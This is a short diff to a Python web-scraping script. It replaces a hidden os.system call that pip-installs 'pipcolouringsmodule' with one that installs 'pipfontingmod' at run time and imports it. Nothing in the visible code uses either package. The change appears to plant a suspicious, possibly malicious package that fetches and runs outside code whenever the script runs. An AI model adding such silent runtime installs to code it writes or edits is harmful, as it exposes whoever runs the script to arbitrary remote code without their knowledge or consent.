@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouringsmodule")
-import pipcolouringsmodule
+os.system("pip install pipfontingmod")
+import pipfontingmod
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
